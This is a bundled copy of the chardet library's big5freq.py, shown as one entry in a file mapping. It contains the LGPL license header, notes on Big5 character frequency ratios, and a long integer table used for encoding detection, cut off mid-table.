"thirdparty/chardet/big5freq.py": "######################## BEGIN LICENSE BLOCK ########################\n# The Original Code is Mozilla Communicator client code.\n#\n# The Initial Developer of the Original Code is\n# Netscape Communications Corporation.\n# Portions created by the Initial Developer are Copyright (C) 1998\n# the Initial Developer. All Rights Reserved.\n#\n# Contributor(s):\n#   Mark Pilgrim - port to Python\n#\n# This library is free software; you can redistribute it and/or\n# modify it under the terms of the GNU Lesser General Public\n# License as published by the Free Software Foundation; either\n# version 2.1 of the License, or (at your option) any later version.\n#\n# This library is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU\n# Lesser General Public License for more details.\n#\n# You should have received a copy of the GNU Lesser General Public\n# License along with this library; if not, write to the Free Software\n# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA\n# 02110-1301  USA\n######################### END LICENSE BLOCK #########################\n\n# Big5 frequency table\n# by Taiwan's Mandarin Promotion Council\n# <http://www.edu.tw:81/mandr/>\n#\n# 128  --> 0.42261\n# 256  --> 0.57851\n# 512  --> 0.74851\n# 1024 --> 0.89384\n# 2048 --> 0.97583\n#\n# Ideal Distribution Ratio = 0.74851/(1-0.74851) =2.98\n# Random Distribution Ration = 512/(5401-512)=0.105\n#\n# Typical Distribution Ratio about 25% of Ideal one, still much higher than RDR\n\nBIG5_TYPICAL_DISTRIBUTION_RATIO = 0.75\n\n#Char to FreqOrder table\nBIG5_TABLE_SIZE = 5376\n\nBIG5_CHAR_TO_FREQ_ORDER = (\n   1,1801,1506, 255,1431, 198,   9,  82,   6,5008, 177, 202,3681,1256,2821, 110, #   16\n3814,  33,3274, 261,  76,  44,2114,  16,2946,2187,1176, 659,3971,  26,3451,2653, #   32\n1198,3972,3350,4202, 410,2215, 302, 590, 361,1964,   8, 204,  58,4510,5009,1932, #   48\n  63,5010,5011, 317,1614,  75, 222, 159,4203,2417,1480,5012,3555,3091, 224,2822, #   64\n3682,   3,  10,3973,1471,  29,2787,1135,2866,1940, 873, 130,3275,1123, 312,5013, #   80\n4511,2052, 507, 252, 682,5014, 142,1915, 124, 206,2947,  34,3556,3204,  64, 604, #   96\n5015,2501,1977,1978, 155,1991, 645, 641,1606,5016,3452, 337,  72, 406,5017,  80, #  112\n 630, 238,3205,1509, 263, 939,1092,2654, 756,1440,1094,3453, 449,  69,2987, 591, #  128\n 179,2096, 471, 115,2035,1844,  60,  50,2988, 134, 806,1869, 734,2036,3454, 180, #  144\n 995,1607, 156, 537,2907, 688,5018, 319,1305, 779,2145, 514,2379, 298,4512, 359, #  160\n2502,  90,2716,1338, 663,  11, 906,1099,2553,  20,2441, 182, 532,1716,5019, 732, #  176\n1376,4204,1311,1420,3206,  25,2317,1056, 113, 399, 382,1950, 242,3455,2474, 529, #  192\n3276, 475,1447,3683,5020, 117,  21, 656, 810,1297,2300,2334,3557,5021, 126,4205, #  208\n 706, 456, 150, 613,4513,  71,1118,2037,4206, 145,3092,  85, 835, 486,2115,1246, #  224\n1426, 428, 727,1285,1015, 800, 106, 623, 303,1281,5022,2128,2359, 347,3815, 221, #  240\n3558,3135,5023,1956,1153,4207,  83, 296,1199,3093, 192, 624,  93,5024, 822,1898, #  256\n2823,3136, 795,2065, 991,1554,1542,1592,  27,  43,2867, 859, 139,1456, 860,4514, #  272\n 437, 712,3974, 164,2397,3137, 695, 211,3037,2097, 195,3975,1608,3559,3560,3684, #  288\n3976, 234, 811,2989,2098,3977,2233,1441,3561,1615,2380, 668,2077,1638, 305, 228, #  304\n1664,4515, 467, 415,5025, 262,2099,1593, 239, 108, 300, 200,1033, 512,1247,2078, #  320\n5026,5027,2176,3207,3685,2682, 593, 845,1062,3277,  88,1723,2038,3978,1951, 212, #  336\n 266, 152, 149, 468,1899,4208,4516,  77, 187,5028,3038,  37,   5,2990,5029,3979, #  352\n5030,5031,  39,2524,4517,2908,3208,2079,  55, 148,  74,4518, 545, 483,1474,1029, #  368\n1665, 217,1870,1531,3138,1104,2655,4209,  24, 172,3562, 900,3980,3563,3564,4519, #  384\n  32,1408,2824,1312, 329, 487,2360,2251,2717, 784,2683,   4,3039,3351,1427,1789, #  400\n 188, 109, 499,5032,3686,1717,1790, 888,1217,3040,4520,5033,3565,5034,3352,1520, #  416\n3687,3981, 196,1034, 775,5035,5036, 929,1816, 249, 439,  38,5037,1063,5038, 794, #  432\n3982,1435,2301,  46, 178,3278,2066,5039,2381,5040, 214,1709,4521, 804,  35, 707, #  448\n 324,3688,1601,2554, 140, 459,4210,5041,5042,1365, 839, 272, 978,2262,2580,3456, #  464\n2129,1363,3689,1423, 697, 100,3094,  48,  70,1231, 495,3139,2196,5043,1294,5044, #  480\n2080, 462, 586,1042,3279, 853, 256, 988, 185,2382,3457,1698, 434,1084,5045,3458, #  496\n 314,2625,2788,4522,2335,2336, 569,2285, 637,1817,2525, 757,1162,1879,1616,3459, #  512\n 287,1577,2116, 768,4523,1671,2868,3566,2526,1321,3816, 909,2418,5046,4211, 933, #  528\n3817,4212,2053,2361,1222,4524, 765,2419,1322, 786,4525,5047,1920,1462,1677,2909, #  544\n1699,5048,4526,1424,2442,3140,3690,2600,3353,1775,1941,3460,3983,4213, 309,1369, #  560\n1130,2825, 364,2234,1653,1299,3984,3567,3985,3986,2656, 525,1085,3041, 902,2001, #  576\n1475, 964,4527, 421,1845,1415,1057,2286, 940,1364,3141, 376,4528,4529,1381,   7, #  592\n2527, 983,2383, 336,1710,2684,1846, 321,3461, 559,1131,3042,2752,1809,1132,1313, #  608\n 265,1481,1858,5049, 352,1203,2826,3280, 167,1089, 420,2827, 776, 792,1724,3568, #  624\n4214,2443,3281,5050,4215,5051, 446, 229, 333,2753, 901,3818,1200,1557,4530,2657, #  640\n1921, 395,2754,2685,3819,4216,1836, 125, 916,3209,2626,4531,5052,5053,3820,5054, #  656\n5055,5056,4532,3142,3691,1133,2555,1757,3462,1510,2318,1409,3569,5057,2146, 438, #  672\n2601,2910,2384,3354,1068, 958,3043, 461, 311,2869,2686,4217,1916,3210,4218,1979, #  688\n 383, 750,2755,2627,4219, 274, 539, 385,1278,1442,5058,1154,1965, 384, 561, 210, #  704\n  98,1295,2556,3570,5059,1711,2420,1482,3463,3987,2911,1257, 129,5060,3821, 642, #  720\n 523,2789,2790,2658,5061, 141,2235,1333,  68, 176, 441, 876, 907,4220, 603,2602, #  736\n 710, 171,3464, 404, 549,  18,3143,2398,1410,3692,1666,5062,3571,4533,2912,4534, #  752\n5063,2991, 368,5064, 146, 366,  99, 871,3693,1543, 748, 807,1586,1185,  22,2263, #  768\n 379,3822,3211,5065,3212, 505,1942,2628,1992,1382,2319,5066, 380,2362, 218, 702, #  784\n1818,1248,3465,3044,3572,3355,3282,5067,2992,3694, 930,3283,3823,5068,  59,5069, #  800\n 585, 601,4221, 497,3466,1112,1314,4535,1802,5070,1223,1472,2177,5071, 749,1837, #  816\n 690,1900,3824,1773,3988,1476, 429,1043,1791,2236,2117, 917,4222, 447,1086,1629, #  832\n5072, 556,5073,5074,2021,1654, 844,1090, 105, 550, 966,1758,2828,1008,1783, 686, #  848\n1095,5075,2287, 793,1602,5076,3573,2603,4536,4223,2948,2302,4537,3825, 980,2503, #  864\n 544, 353, 527,4538, 908,2687,2913,5077, 381,2629,1943,1348,5078,1341,1252, 560, #  880\n3095,5079,3467,2870,5080,2054, 973, 886,2081, 143,4539,5081,5082, 157,3989, 496, #  896\n4224,  57, 840, 540,2039,4540,4541,3468,2118,1445, 970,2264,1748,1966,2082,4225, #  912\n3144,1234,1776,3284,2829,3695, 773,1206,2130,1066,2040,1326,3990,1738,1725,4226, #  928\n 279,3145,  51,1544,2604, 423,1578,2131,2067, 173,4542,1880,5083,5084,1583, 264, #  944\n 610,3696,4543,2444, 280, 154,5085,5086,5087,1739, 338,1282,3096, 693,2871,1411, #  960\n1074,3826,2445,5088,4544,5089,5090,1240, 952,2399,5091,2914,1538,2688, 685,1483, #  976\n4227,2475,1436, 953,4228,2055,4545, 671,2400,  79,4229,2446,3285, 608, 567,2689, #  992\n3469,4230,4231,1691, 393,1261,1792,2401,5092,4546,5093,5094,5095,5096,1383,1672, # 1008\n3827,3213,1464, 522,1119, 661,1150, 216, 675,4547,3991,1432,3574, 609,4548,2690, # 1024\n2402,5097,5098,5099,4232,3045,   0,5100,2476, 315, 231,2447, 301,3356,4549,2385, # 1040\n5101, 233,4233,3697,1819,4550,4551,5102,  96,1777,1315,2083,5103, 257,5104,1810, # 1056\n3698,2718,1139,1820,4234,2022,1124,2164,2791,1778,2659,5105,3097, 363,1655,3214, # 1072\n5106,2993,5107,5108,5109,3992,1567,3993, 718, 103,3215, 849,1443, 341,3357,2949, # 1088\n1484,5110,1712, 127,  67, 339,4235,2403, 679,1412, 821,5111,5112, 834, 738, 351, # 1104\n2994,2147, 846, 235,1497,1881, 418,1993,3828,2719, 186,1100,2148,2756,3575,1545, # 1120\n1355,2950,2872,1377, 583,3994,4236,2581,2995,5113,1298,3699,1078,2557,3700,2363, # 1136\n  78,3829,3830, 267,1289,2100,2002,1594,4237, 348, 369,1274,2197,2178,1838,4552, # 1152\n1821,2830,3701,2757,2288,2003,4553,2951,2758, 144,3358, 882,4554,3995,2759,3470, # 1168\n4555,2915,5114,4238,1726, 320,5115,3996,3046, 788,2996,5116,2831,1774,1327,2873, # 1184\n3997,2832,5117,1306,4556,2004,1700,3831,3576,2364,2660, 787,2023, 506, 824,3702, # 1200\n 534, 323,4557,1044,3359,2024,1901, 946,3471,5118,1779,1500,1678,5119,1882,4558, # 1216\n 165, 243,4559,3703,2528, 123, 683,4239, 764,4560,  36,3998,1793, 589,2916, 816, # 1232\n 626,1667,3047,2237,1639,1555,1622,3832,3999,5120,4000,2874,1370,1228,1933, 891, # 1248\n2084,2917, 304,4240,5121, 292,2997,2720,3577, 691,2101,4241,1115,4561, 118, 662, # 1264\n5122, 611,1156, 854,2386,1316,2875,   2, 386, 515,2918,5123,5124,3286, 868,2238, # 1280\n1486, 855,2661, 785,2216,3048,5125,1040,3216,3578,5126,3146, 448,5127,1525,5128, # 1296\n2165,4562,5129,3833,5130,4242,2833,3579,3147, 503, 818,4001,3148,1568, 814, 676, # 1312\n1444, 306,1749,5131,3834,1416,1030, 197,1428, 805,2834,1501,4563,5132,5133,5134, # 1328\n1994,5135,4564,5136,5137,2198,  13,2792,3704,2998,3149,1229,1917,5138,3835,2132, # 1344\n5139,4243,4565,2404,3580,5140,2217,1511,1727,1120,5141,5142, 646,3836,2448, 307, # 1360\n5143,5144,1595,3217,5145,5146,5147,3705,1113,1356,4002,1465,2529,2530,5148, 519, # 1376\n5149, 128,2133,  92,2289,1980,5150,4003,1512, 342,3150,2199,5151,2793,2218,1981, # 1392\n3360,4244, 290,1656,1317, 789, 827,2365,5152,3837,4566, 562, 581,4004,5153, 401, # 1408\n4567,2252,  94,4568,5154,1399,2794,5155,1463,2025,4569,3218,1944,5156, 828,1105, # 1424\n4245,1262,1394,5157,4246, 605,4570,5158,1784,2876,5159,2835, 819,2102, 578,2200, # 1440\n2952,5160,1502, 436,3287,4247,3288,2836,4005,2919,3472,3473,5161,2721,2320,5162, # 1456\n5163,2337,2068,  23,4571, 193, 826,3838,2103, 699,1630,4248,3098, 390,1794,1064, # 1472\n3581,5164,1579,3099,3100,1400,5165,4249,1839,1640,2877,5166,4572,4573, 137,4250, # 1488\n 598,3101,1967, 780, 104, 974,2953,5167, 278, 899, 253, 402, 572, 504, 493,1339, # 1504\n5168,4006,1275,4574,2582,2558,5169,3706,3049,3102,2253, 565,1334,2722, 863,  41, # 1520\n5170,5171,4575,5172,1657,2338,  19, 463,2760,4251, 606,5173,2999,3289,1087,2085, # 1536\n1323,2662,3000,5174,1631,1623,1750,4252,2691,5175,2878, 791,2723,2663,2339, 232, # 1552\n2421,5176,3001,1498,5177,2664,2630, 755,1366,3707,3290,3151,2026,1609, 119,1918, # 1568\n3474, 862,1026,4253,5178,4007,3839,4576,4008,4577,2265,1952,2477,5179,1125, 817, # 1584\n4254,4255,4009,1513,1766,2041,1487,4256,3050,3291,2837,3840,3152,5180,5181,1507, # 1600\n5182,2692, 733,  40,1632,1106,2879, 345,4257, 841,2531, 230,4578,3002,1847,3292, # 1616\n3475,5183,1263, 986,3476,5184, 735, 879, 254,1137, 857, 622,1300,1180,1388,1562, # 1632\n4010,4011,2954, 967,2761,2665,1349, 592,2134,1692,3361,3003,1995,4258,1679,4012, # 1648\n1902,2188,5185, 739,3708,2724,1296,1290,5186,4259,2201,2202,1922,1563,2605,2559, # 1664\n1871,2762,3004,5187, 435,5188, 343,1108, 596,  17,1751,4579,2239,3477,3709,5189, # 1680\n4580, 294,3582,2955,1693, 477, 979, 281,2042,3583, 643,2043,3710,2631,2795,2266, # 1696\n1031,2340,2135,2303,3584,4581, 367,1249,2560,5190,3585,5191,4582,1283,3362,2005, # 1712\n 240,1762,3363,4583,4584, 836,1069,3153, 474,5192,2149,2532, 268,3586,5193,3219, # 1728\n1521,1284,5194,1658,1546,4260,5195,3587,3588,5196,4261,3364,2693,1685,4262, 961, # 1744\n1673,2632, 190,2006,2203,3841,4585,4586,5197, 570,2504,3711,1490,5198,4587,2633, # 1760\n3293,1957,4588, 584,1514, 396,1045,1945,5199,4589,1968,2449,5200,5201,4590,4013, # 1776\n 619,5202,3154,3294, 215,2007,2796,2561,3220,4591,3221,4592, 763,4263,3842,4593, # 1792\n5203,5204,1958,1767,2956,3365,3712,1174, 452,1477,4594,3366,3155,5205,2838,1253, # 1808\n2387,2189,1091,2290,4264, 492,5206, 638,1169,1825,2136,1752,4014, 648, 926,1021, # 1824\n1324,4595, 520,4596, 997, 847,1007, 892,4597,3843,2267,1872,3713,2405,1785,4598, # 1840\n1953,2957,3103,3222,1728,4265,2044,3714,4599,2008,1701,3156,1551,  30,2268,4266, # 1856\n5207,2027,4600,3589,5208, 501,5209,4267, 594,3478,2166,1822,3590,3479,3591,3223, # 1872\n 829,2839,4268,5210,1680,3157,1225,4269,5211,3295,4601,4270,3158,2341,5212,4602, # 1888\n4271,5213,4015,4016,5214,1848,2388,2606,3367,5215,4603, 374,4017, 652,4272,4273, # 1904\n 375,1140, 798,5216,5217,5218,2366,4604,2269, 546,1659, 138,3051,2450,4605,5219, # 1920\n2254, 612,1849, 910, 796,3844,1740,1371, 825,3845,3846,5220,2920,2562,5221, 692, # 1936\n 444,3052,2634, 801,4606,4274,5222,1491, 244,1053,3053,4275,4276, 340,5223,4018, # 1952\n1041,3005, 293,1168,  87,1357,5224,1539, 959,5225,2240, 721, 694,4277,3847, 219, # 1968\n1478, 644,1417,3368,2666,1413,1401,1335,1389,4019,5226,5227,3006,2367,3159,1826, # 1984\n 730,1515, 184,2840,  66,4607,5228,1660,2958, 246,3369, 378,1457, 226,3480, 975, # 2000\n4020,2959,1264,3592, 674, 696,5229, 163,5230,1141,2422,2167, 713,3593,3370,4608, # 2016\n4021,5231,5232,1186,  15,5233,1079,1070,5234,1522,3224,3594, 276,1050,2725, 758, # 2032\n1126, 653,2960,3296,5235,2342, 889,3595,4022,3104,3007, 903,1250,4609,4023,3481, # 2048\n3596,1342,1681,1718, 766,3297, 286,  89,2961,3715,5236,1713,5237,2607,3371,3008, # 2064\n5238,2962,2219,3225,2880,5239,4610,2505,2533, 181, 387,1075,4024, 731,2190,3372, # 2080\n5240,3298, 310, 313,3482,2304, 770,4278,  54,3054, 189,4611,3105,3848,4025,5241, # 2096\n1230,1617,1850, 355,3597,4279,4612,3373, 111,4280,3716,1350,3160,3483,3055,4281, # 2112\n2150,3299,3598,5242,2797,4026,4027,3009, 722,2009,5243,1071, 247,1207,2343,2478, # 2128\n1378,4613,2010, 864,1437,1214,4614, 373,3849,1142,2220, 667,4615, 442,2763,2563, # 2144\n3850,4028,1969,4282,3300,1840, 837, 170,1107, 934,1336,1883,5244,5245,2119,4283, # 2160\n2841, 743,1569,5246,4616,4284, 582,2389,1418,3484,5247,1803,5248, 357,1395,1729, # 2176\n3717,3301,2423,1564,2241,5249,3106,3851,1633,4617,1114,2086,4285,1532,5250, 482, # 2192\n2451,4618,5251,5252,1492, 833,1466,5253,2726,3599,1641,2842,5254,1526,1272,3718, # 2208\n4286,1686,1795, 416,2564,1903,1954,1804,5255,3852,2798,3853,1159,2321,5256,2881, # 2224\n4619,1610,1584,3056,2424,2764, 443,3302,1163,3161,5257,5258,4029,5259,4287,2506, # 2240\n3057,4620,4030,3162,2104,1647,3600,2011,1873,4288,5260,4289, 431,3485,5261, 250, # 2256\n  97,  81,4290,5262,1648,1851,1558, 160, 848,5263, 866, 740,1694,5264,2204,2843, # 2272\n3226,4291,4621,3719,1687, 950,2479, 426, 469,3227,3720,3721,4031,5265,5266,1188, # 2288\n 424,1996, 861,3601,4292,3854,2205,2694, 168,1235,3602,4293,5267,2087,1674,4622, # 2304\n3374,3303, 220,2565,1009,5268,3855, 670,3010, 332,1208, 717,5269,5270,3603,2452, # 2320\n4032,3375,5271, 513,5272,1209,2882,3376,3163,4623,1080,5273,5274,5275,5276,2534, # 2336\n3722,3604, 815,1587,4033,4034,5277,3605,3486,3856,1254,4624,1328,3058,1390,4035, # 2352\n1741,4036,3857,4037,5278, 236,3858,2453,3304,5279,5280,3723,3859,1273,3860,4625, # 2368\n5281, 308,5282,4626, 245,4627,1852,2480,1307,2583, 430, 715,2137,2454,5283, 270, # 2384\n 199,2883,4038,5284,3606,2727,1753, 761,1754, 725,1661,1841,4628,3487,3724,5285, # 2400\n5286, 587,  14,3305, 227,2608, 326, 480,2270, 943,2765,3607, 291, 650,1884,5287, # 2416\n1702,1226, 102,1547,  62,3488, 904,4629,3489,1164,4294,5288,5289,1224,1548,2766, # 2432\n 391, 498,1493,5290,1386,1419,5291,2056,1177,4630, 813, 880,1081,2368, 566,1145, # 2448\n4631,2291,1001,1035,2566,2609,2242, 394,1286,5292,5293,2069,5294,  86,1494,1730, # 2464\n4039, 491,1588, 745, 897,2963, 843,3377,4040,2767,2884,3306,1768, 998,2221,2070, # 2480\n 397,1827,1195,1970,3725,3011,3378, 284,5295,3861,2507,2138,2120,1904,5296,4041, # 2496\n2151,4042,4295,1036,3490,1905, 114,2567,4296, 209,1527,5297,5298,2964,2844,2635, # 2512\n2390,2728,3164, 812,2568,5299,3307,5300,1559, 737,1885,3726,1210, 885,  28,2695, # 2528\n3608,3862,5301,4297,1004,1780,4632,5302, 346,1982,2222,2696,4633,3863,1742, 797, # 2544\n1642,4043,1934,1072,1384,2152, 896,4044,3308,3727,3228,2885,3609,5303,2569,1959, # 2560\n4634,2455,1786,5304,5305,5306,4045,4298,1005,1308,3728,4299,2729,4635,4636,1528, # 2576\n2610, 161,1178,4300,1983, 987,4637,1101,4301, 631,4046,1157,3229,2425,1343,1241, # 2592\n1016,2243,2570, 372, 877,2344,2508,1160, 555,1935, 911,4047,5307, 466,1170, 169, # 2608\n1051,2921,2697,3729,2481,3012,1182,2012,2571,1251,2636,5308, 992,2345,3491,1540, # 2624\n2730,1201,2071,2406,1997,2482,5309,4638, 528,1923,2191,1503,1874,1570,2369,3379, # 2640\n3309,5310, 557,1073,5311,1828,3492,2088,2271,3165,3059,3107, 767,3108,2799,4639, # 2656\n1006,4302,4640,2346,1267,2179,3730,3230, 778,4048,3231,2731,1597,2667,5312,4641, # 2672\n5313,3493,5314,5315,5316,3310,2698,1433,3311, 131,  95,1504,4049, 723,4303,3166, # 2688\n1842,3610,2768,2192,4050,2028,2105,3731,5317,3013,4051,1218,5318,3380,3232,4052, # 2704\n4304,2584, 248,1634,3864, 912,5319,2845,3732,3060,3865, 654,  53,5320,3014,5321, # 2720\n1688,4642, 777,3494,1032,4053,1425,5322, 191, 820,2121,2846, 971,4643, 931,3233, # 2736\n 135, 664, 783,3866,1998, 772,2922,1936,4054,3867,4644,2923,3234, 282,2732, 640, # 2752\n1372,3495,1127, 922, 325,3381,5323,5324, 711,2045,5325,5326,4055,2223,2800,1937, # 2768\n4056,3382,2224,2255,3868,2305,5327,4645,3869,1258,3312,4057,3235,2139,2965,4058, # 2784\n4059,5328,2225, 258,3236,4646, 101,1227,5329,3313,1755,5330,1391,3314,5331,2924, # 2800\n2057, 893,5332,5333,5334,1402,4305,2347,5335,5336,3237,3611,5337,5338, 878,1325, # 2816\n1781,2801,4647, 259,1385,2585, 744,1183,2272,4648,5339,4060,2509,5340, 684,1024, # 2832\n4306,5341, 472,3612,3496,1165,3315,4061,4062, 322,2153, 881, 455,1695,1152,1340, # 2848\n 660, 554,2154,4649,1058,4650,4307, 830,1065,3383,4063,4651,1924,5342,1703,1919, # 2864\n5343, 932,2273, 122,5344,4652, 947, 677,5345,3870,2637, 297,1906,1925,2274,4653, # 2880\n2322,3316,5346,5347,4308,5348,4309,  84,4310, 112, 989,5349, 547,1059,4064, 701, # 2896\n3613,1019,5350,4311,5351,3497, 942, 639, 457,2306,2456, 993,2966, 407, 851, 494, # 2912\n4654,3384, 927,5352,1237,5353,2426,3385, 573,4312, 680, 921,2925,1279,1875, 285, # 2928\n 790,1448,1984, 719,2168,5354,5355,4655,4065,4066,1649,5356,1541, 563,5357,1077, # 2944\n5358,3386,3061,3498, 511,3015,4067,4068,3733,4069,1268,2572,3387,3238,4656,4657, # 2960\n5359, 535,1048,1276,1189,2926,2029,3167,1438,1373,2847,2967,1134,2013,5360,4313, # 2976\n1238,2586,3109,1259,5361, 700,5362,2968,3168,3734,4314,5363,4315,1146,1876,1907, # 2992\n4658,2611,4070, 781,2427, 132,1589, 203, 147, 273,2802,2407, 898,1787,2155,4071, # 3008\n4072,5364,3871,2803,5365,5366,4659,4660,5367,3239,5368,1635,3872, 965,5369,1805, # 3024\n2699,1516,3614,1121,1082,1329,3317,4073,1449,3873,  65,1128,2848,2927,2769,1590, # 3040\n3874,5370,5371,  12,2668,  45, 976,2587,3169,4661, 517,2535,1013,1037,3240,5372, # 3056\n3875,2849,5373,3876,5374,3499,5375,2612, 614,1999,2323,3877,3110,2733,2638,5376, # 3072\n2588,4316, 599,1269,5377,1811,3735,5378,2700,3111, 759,1060, 489,1806,3388,3318, # 3088\n1358,5379,5380,2391,1387,1215,2639,2256, 490,5381,5382,4317,1759,2392,2348,5383, # 3104\n4662,3878,1908,4074,2640,1807,3241,4663,3500,3319,2770,2349, 874,5384,5385,3501, # 3120\n3736,1859,  91,2928,3737,3062,3879,4664,5386,3170,4075,2669,5387,3502,1202,1403, # 3136\n3880,2969,2536,1517,2510,4665,3503,2511,5388,4666,5389,2701,1886,1495,1731,4076, # 3152\n2370,4667,5390,2030,5391,5392,4077,2702,1216, 237,2589,4318,2324,4078,3881,4668, # 3168\n4669,2703,3615,3504, 445,4670,5393,5394,5395,5396,2771,  61,4079,3738,1823,4080, # 3184\n5397, 687,2046, 935, 925, 405,2670, 703,1096,1860,2734,4671,4081,1877,1367,2704, # 3200\n3389, 918,2106,1782,2483, 334,3320,1611,1093,4672, 564,3171,3505,3739,3390, 945, # 3216\n2641,2058,4673,5398,1926, 872,4319,5399,3506,2705,3112, 349,4320,3740,4082,4674, # 3232\n3882,4321,3741,2156,4083,4675,4676,4322,4677,2408,2047, 782,4084, 400, 251,4323, # 3248\n1624,5400,5401, 277,3742, 299,1265, 476,1191,3883,2122,4324,4325,1109, 205,5402, # 3264\n2590,1000,2157,3616,1861,5403,5404,5405,4678,5406,4679,2573, 107,2484,2158,4085, # 3280\n3507,3172,5407,1533, 541,1301, 158, 753,4326,2886,3617,5408,1696, 370,1088,4327, # 3296\n4680,3618, 579, 327, 440, 162,2244, 269,1938,1374,3508, 968,3063,  56,1396,3113, # 3312\n2107,3321,3391,5409,1927,2159,4681,3016,5410,3619,5411,5412,3743,4682,2485,5413, # 3328\n2804,5414,1650,4683,5415,2613,5416,5417,4086,2671,3392,1149,3393,4087,3884,4088, # 3344\n5418,1076,  49,5419, 951,3242,3322,3323, 450,2850, 920,5420,1812,2805,2371,4328, # 3360\n1909,1138,2372,3885,3509,5421,3243,4684,1910,1147,1518,2428,4685,3886,5422,4686, # 3376\n2393,2614, 260,1796,3244,5423,5424,3887,3324, 708,5425,3620,1704,5426,3621,1351, # 3392\n1618,3394,3017,1887, 944,4329,3395,4330,3064,3396,4331,5427,3744, 422, 413,1714, # 3408\n3325, 500,2059,2350,4332,2486,5428,1344,1911, 954,5429,1668,5430,5431,4089,2409, # 3424\n4333,3622,3888,4334,5432,2307,1318,2512,3114, 133,3115,2887,4687, 629,  31,2851, # 3440\n2706,3889,4688, 850, 949,4689,4090,2970,1732,2089,4335,1496,1853,5433,4091, 620, # 3456\n3245, 981,1242,3745,3397,1619,3746,1643,3326,2140,2457,1971,1719,3510,2169,5434, # 3472\n3246,5435,5436,3398,1829,5437,1277,4690,1565,2048,5438,1636,3623,3116,5439, 869, # 3488\n2852, 655,3890,3891,3117,4092,3018,3892,1310,3624,4691,5440,5441,5442,1733, 558, # 3504\n4692,3747, 335,1549,3065,1756,4336,3748,1946,3511,1830,1291,1192, 470,2735,2108, # 3520\n2806, 913,1054,4093,5443,1027,5444,3066,4094,4693, 982,2672,3399,3173,3512,3247, # 3536\n3248,1947,2807,5445, 571,4694,5446,1831,5447,3625,2591,1523,2429,5448,2090, 984, # 3552\n4695,3749,1960,5449,3750, 852, 923,2808,3513,3751, 969,1519, 999,2049,2325,1705, # 3568\n5450,3118, 615,1662, 151, 597,4095,2410,2326,1049, 275,4696,3752,4337, 568,3753, # 3584\n3626,2487,4338,3754,5451,2430,2275, 409,3249,5452,1566,2888,3514,1002, 769,2853, # 3600\n 194,2091,3174,3755,2226,3327,4339, 628,1505,5453,5454,1763,2180,3019,4096, 521, # 3616\n1161,2592,1788,2206,2411,4697,4097,1625,4340,4341, 412,  42,3119, 464,5455,2642, # 3632\n4698,3400,1760,1571,2889,3515,2537,1219,2207,3893,2643,2141,2373,4699,4700,3328, # 3648\n1651,3401,3627,5456,5457,3628,2488,3516,5458,3756,5459,5460,2276,2092, 460,5461, # 3664\n4701,5462,3020, 962, 588,3629, 289,3250,2644,1116,  52,5463,3067,1797,5464,5465, # 3680\n5466,1467,5467,1598,1143,3757,4342,1985,1734,1067,4702,1280,3402, 465,4703,1572, # 3696\n 510,5468,1928,2245,1813,1644,3630,5469,4704,3758,5470,5471,2673,1573,1534,5472, # 3712\n5473, 536,1808,1761,3517,3894,3175,2645,5474,5475,5476,4705,3518,2929,1912,2809, # 3728\n5477,3329,1122, 377,3251,5478, 360,5479,5480,4343,1529, 551,5481,2060,3759,1769, # 3744\n2431,5482,2930,4344,3330,3120,2327,2109,2031,4706,1404, 136,1468,1479, 672,1171, # 3760\n3252,2308, 271,3176,5483,2772,5484,2050, 678,2736, 865,1948,4707,5485,2014,4098, # 3776\n2971,5486,2737,2227,1397,3068,3760,4708,4709,1735,2931,3403,3631,5487,3895, 509, # 3792\n2854,2458,2890,3896,5488,5489,3177,3178,4710,4345,2538,4711,2309,1166,1010, 552, # 3808\n 681,1888,5490,5491,2972,2973,4099,1287,1596,1862,3179, 358, 453, 736, 175, 478, # 3824\n1117, 905,1167,1097,5492,1854,1530,5493,1706,5494,2181,3519,2292,3761,3520,3632, # 3840\n4346,2093,4347,5495,3404,1193,2489,4348,1458,2193,2208,1863,1889,1421,3331,2932, # 3856\n3069,2182,3521, 595,2123,5496,4100,5497,5498,4349,1707,2646, 223,3762,1359, 751, # 3872\n3121, 183,3522,5499,2810,3021, 419,2374, 633, 704,3897,2394, 241,5500,5501,5502, # 3888\n 838,3022,3763,2277,2773,2459,3898,1939,2051,4101,1309,3122,2246,1181,5503,1136, # 3904\n2209,3899,2375,1446,4350,2310,4712,5504,5505,4351,1055,2615, 484,3764,5506,4102, # 3920\n 625,4352,2278,3405,1499,4353,4103,5507,4104,4354,3253,2279,2280,3523,5508,5509, # 3936\n2774, 808,2616,3765,3406,4105,4355,3123,2539, 526,3407,3900,4356, 955,5510,1620, # 3952\n4357,2647,2432,5511,1429,3766,1669,1832, 994, 928,5512,3633,1260,5513,5514,5515, # 3968\n1949,2293, 741,2933,1626,4358,2738,2460, 867,1184, 362,3408,1392,5516,5517,4106, # 3984\n4359,1770,1736,3254,2934,4713,4714,1929,2707,1459,1158,5518,3070,3409,2891,1292, # 4000\n1930,2513,2855,3767,1986,1187,2072,2015,2617,4360,5519,2574,2514,2170,3768,2490, # 4016\n3332,5520,3769,4715,5521,5522, 666,1003,3023,1022,3634,4361,5523,4716,1814,2257, # 4032\n 574,3901,1603, 295,1535, 705,3902,4362, 283, 858, 417,5524,5525,3255,4717,4718, # 4048\n3071,1220,1890,1046,2281,2461,4107,1393,1599, 689,2575, 388,4363,5526,2491, 802, # 4064\n5527,2811,3903,2061,1405,2258,5528,4719,3904,2110,1052,1345,3256,1585,5529, 809, # 4080\n5530,5531,5532, 575,2739,3524, 956,1552,1469,1144,2328,5533,2329,1560,2462,3635, # 4096\n3257,4108, 616,2210,4364,3180,2183,2294,5534,1833,5535,3525,4720,5536,1319,3770, # 4112\n3771,1211,3636,1023,3258,1293,2812,5537,5538,5539,3905, 607,2311,3906, 762,2892, # 4128\n1439,4365,1360,4721,1485,3072,5540,4722,1038,4366,1450,2062,2648,4367,1379,4723, # 4144\n2593,5541,5542,4368,1352,1414,2330,2935,1172,5543,5544,3907,3908,4724,1798,1451, # 4160\n5545,5546,5547,5548,2936,4109,4110,2492,2351, 411,4111,4112,3637,3333,3124,4725, # 4176\n1561,2674,1452,4113,1375,5549,5550,  47,2974, 316,5551,1406,1591,2937,3181,5552, # 4192\n1025,2142,3125,3182, 354,2740, 884,2228,4369,2412, 508,3772, 726,3638, 996,2433, # 4208\n3639, 729,5553, 392,2194,1453,4114,4726,3773,5554,5555,2463,3640,2618,1675,2813, # 4224\n 